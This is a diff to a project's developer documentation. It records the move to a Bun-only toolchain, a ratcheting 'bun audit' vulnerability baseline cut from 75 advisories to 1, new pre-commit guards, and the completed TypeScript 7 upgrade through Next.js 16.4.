+  packages, and trunk downloads that runtime into its own cache. Trunk was
+  not wired into CI or into the lefthook gates (`trunk-check-pre-push` and
+  `trunk-fmt-pre-commit` were disabled in favour of lefthook), so it
+  downloaded a Node runtime in order to gate nothing. It is removed.
+  `scripts/hooks/no-node-runtime.mjs` now has a rule for the shape it took —
+  a `node@<version>` runtime declaration in a config file — so the same
+  mistake cannot come back through a linter's settings. The distinction
+  matters because "no Node anywhere" is the claim the project actually
+  makes about *its* runtime, and a linter's interpreter is not the
+  project's interpreter.
+- **`NODE_OPTIONS` is not a memory control here.** It was, when the build ran
+  on V8: `lint` capped at 2048 MB and `build-e2e` at 1280 MB, and both caps
+  read like load-bearing safety rails. They were not. Every process in those
+  jobs now runs on Bun, and Bun does not read `--max-old-space-size` from
+  `NODE_OPTIONS` — measured on Bun 1.4.4, the heap limit is ~48 MB whether
+  the variable is 768, 1280, 3584 or absent. The caps were removed with the
+  V8 they were protecting. What actually bounds those jobs is
+  `experimental.cpus: 1` (serial prerendering) and Playwright's
+  `--workers=1`. See [`docs/ci-runners.md`](./docs/ci-runners.md).
+
 - **`NEXT_PUBLIC_*` and `SUPABASE_PROJECT_REF` are repository *variables*, not
   secrets.** Next inlines `NEXT_PUBLIC_*` into the client bundle, so they are
   public by construction. Storing them as secrets also broke `ci.yml`: secrets
@@ -572,7 +1157,7 @@ pre-commit gate, so drift fails at commit time rather than at 3am.
      `workers: 1` in CI) to prevent multiple concurrent Chromium instances from fighting
      against Next.js (`next start`) and the mock server for memory.
 - **The local lefthook gates are therefore the real gates**, and they do run on
-  every push: 33 pre-commit guards, then lint → unit → coverage → types → build →
+  every push: 34 pre-commit guards, then lint → unit → coverage → types → build →
   peer-deps → 95 Playwright specs (95 + no running tests). Migrations and Edge Functions are **not**
   deployed by hand: `supabase.yml` is the only delivery path and a push touching
   `supabase/**` is its trigger, so the fix and the deploy are one action. It pushed
@@ -587,6 +1172,52 @@ pre-commit gate, so drift fails at commit time rather than at 3am.
   workflow; a leak makes the row-level security model decorative.
 - Full inventory and rationale: [`docs/ci-secrets.md`](./docs/ci-secrets.md).
 - All four stores together: [`docs/secrets-and-config.md`](./docs/secrets-and-config.md).
+
+## Dependency vulnerabilities
+
+`bun audit` is the Bun-native equivalent of `npm audit`, and it is the only
+thing in this repository that makes "a package with a known CVE" — coding
+rule 7 — computable rather than aspirational. `bun run audit:deps`
+(`scripts/check-vulnerabilities.mjs`) runs it in CI.
+
+**It is a ratchet, not a wall.** The tree cannot be advisory-free today, and
+a permanently-red gate is not a gate. So the accepted set lives in
+`scripts/vulnerabilities-baseline.json`, one entry per advisory, **each with
+the reason it was accepted** — and the gate fails in both directions: a new
+advisory fails, *and* a baselined advisory that has stopped applying fails,
+so a fix has to delete its own excuse rather than leave a stale one behind.
+This is the same shape as `scripts/data-points-baseline.json` and
+`scripts/secrets-baseline.json`, for the same reason.
+
+**An advisory database that cannot be read is UNKNOWN, never clean.** The
+default is to report UNKNOWN and continue, because a network outage is not a
+defect in this repository; `--strict` turns it into a failure. The output
+says UNKNOWN either way, so it is never mistaken for a pass.
+
+**The baseline went from 75 advisories to 1**, and the shape of the work is
+worth recording because it is not the shape you expect:
+
+- **`next` 16.3.2 → 16.3.8** carried three *critical* advisories. `bun audit
+  fix` bumped the pin; the repo pins `next` exactly, so that is a deliberate
+  pin bump and the build and the full suite were re-run against it.
+- **Most of the rest were inside the `vercel` CLI's dependency tree** — a
+  devDependency, not shipped code, whose vulnerable paths (TOML/YAML
+  parsing, schema validation, path matching) this repository does not
+  exercise. The fixes needed *major* bumps against packages pinned to an
+  exact version, which is where a naive fix breaks the tool.
+- **Bun's `overrides` support nested scope**, which is what made the
+  dangerous ones safe: `"@vercel/node": { "undici": "6.28.1" }` moves that
+  one subtree without dragging every other copy of `undici` with it. A flat
+  `overrides` entry for `minimatch` would have forced the 3.x copy to 10.x.
+- **The Vercel CLI was verified end to end afterwards** — `vercel whoami`
+  against the live API, under Bun — because "the CLI still starts" is not
+  evidence that its HTTP stack still works.
+
+**The one advisory that remains has no fix.** `braces@3.0.3` is the latest
+published version, so there is nothing to pin to; it is reachable only
+through `ts-morph` inside the `vercel` tree, and the related
+`brace-expansion` advisory in the same subtree *did* have a fix and was
+resolved. It is in the baseline with that reason attached.
 
 ### Supabase Edge Function secrets — a *separate* store
 
@@ -617,8 +1248,8 @@ deployed green and broke silently.
 
 ## Delivery Gates (lefthook)
 
-- **pre-commit**: secrets, migration guards, RLS/SECURITY DEFINER, Biome, oxlint, typecheck, env contracts (local `.env`, the GitHub Actions inventory, and the secrets registry in `--offline` mode — no network, because a hook that needs a token is a hook that gets bypassed), lockfile pairing, data-points seed↔reader↔fallback consistency (`scripts/check-data-points.mjs` — a seed nobody reads, a read nobody seeds, and a wired fallback that disagrees with its seed all fail, with accepted findings annotated in `scripts/data-points-baseline.json`, and that ratchet only shrinks), documentation numeric claims (`scripts/check-doc-claims.mjs` re-derives guard counts, the suppression baseline, `lefthook.yml`'s length, spec totals and the two coverage floors from their sources of truth), and `playwright test --list` when `e2e/**` changes (spec parse only — no browser launch).
-- **`lefthook.yml` is 528 lines of wiring; the logic is in `scripts/hooks/*.mjs`.** Every
+- **pre-commit**: secrets, migration guards, RLS/SECURITY DEFINER, Biome, oxlint, typecheck, env contracts (local `.env`, the GitHub Actions inventory, and the secrets registry in `--offline` mode — no network, because a hook that needs a token is a hook that gets bypassed), lockfile pairing, data-points seed↔reader↔fallback consistency (`scripts/check-data-points.mjs` — a seed nobody reads, a read nobody seeds, and a wired fallback that disagrees with its seed all fail, with accepted findings annotated in `scripts/data-points-baseline.json`, and that ratchet only shrinks), documentation numeric claims (`scripts/check-doc-claims.mjs` re-derives guard counts, the suppression baseline, `lefthook.yml`'s length, spec totals and the two coverage floors from their sources of truth), the no-Node-runtime guard (`scripts/hooks/no-node-runtime.mjs` — a Node shebang, a second package manager or a `setup-node` step works on a laptop with Node installed and breaks on every runner this project has; CI runs it over the **whole tree** with `--all`, not just the staged subset, so a violation that arrived by a merge is caught too), and `playwright test --list` when `e2e/**` changes (spec parse only — no browser launch).
+- **`lefthook.yml` is 570 lines of wiring; the logic is in `scripts/hooks/*.mjs`.** Every
   guard that was a `run: |` bash block is now a `bun scripts/hooks/<name>.mjs` call, and
   its rationale comment moved into that file's header — where it sits beside the code it
   explains rather than four hundred lines above it. `lefthook.yml` keeps what only it can
@@ -708,12 +1339,35 @@ deployed green and broke silently.
 
 ## Deferred Upgrades
 
-### TypeScript 7 — BLOCKED
-Next.js 16.3 loads TypeScript via the JS compiler API (`lib/typescript.js`), which was removed in TS 7.0. Native-TS builds land ~TS 7.1. Tracking: [vercel/next.js#95633](https://github.com/vercel/next.js/issues/95633).
+### TypeScript 7 — DONE, and it needed Next.js 16.4
 
-**Stay on TypeScript 5.9.** The `tsconfig.json` is already shaped for TS 7 (`moduleResolution: bundler`) so the upgrade will be a version bump only.
+It was blocked for a year, and the block was real: Next.js 16.3 loads
+TypeScript through the JS compiler API (`lib/typescript.js`), and TypeScript 7
+removed that file — TS 7 is the native (Go) compiler and ships a `tsc`
+**binary**, not an API. Tracking: [vercel/next.js#95633](https://github.com/vercel/next.js/issues/95633).
 
-TypeScript 6 is a bridge release (deprecations only) — skip it.
+**Next.js 16.4 removed the block.** It ships `experimental.useTypeScriptCli`,
+which runs the `tsc` binary instead of the API, and resolves that binary from
+the `typescript` package's `bin` metadata. So TypeScript 7's native `tsc` is
+exactly what Next runs — no JS API required, no shim, no second compiler.
+`next.config.ts` sets it, with the reasoning inline.
+
+The spawn is `process.execPath`, which under `bun --bun next build` is the bun
+binary. So the type check that runs inside the build runs on **Bun**, against
+TypeScript 7.1.0-beta's native compiler, in a project with no Node.js.
+
+**The `tsconfig.json` needed no changes.** It was already shaped for TS 7
+(`moduleResolution: bundler`), and the build does not rewrite it —
+verified by diffing before and after a full build.
+
+**The project now runs two TypeScript 7 compilers, on purpose.** `tsrs` (a Rust
+port) is the type-check gate; `bun check` (Bun's typescript-go port) is the
+cross-check. They are independent implementations of the same language, and
+their agreement is worth more than either alone. See "The runtime is Bun" for
+the details.
+
+**TypeScript 6 was never worth having** — a bridge release of deprecations
+only — and it is now moot.
 
 ---
 
@@ -853,7 +1507,7 @@ Quick trigger table:
 | `vgpu` | WebGPU / shader work (`vgpu` package) |
 | `vercel-react-native-skills` | Not applicable — web-only project |
 
-Update: `npx skills update` · Restore: `npx skills experimental_install`
+Update: `bunx skills update` · Restore: `bunx skills experimental_install`
 
 ---
 
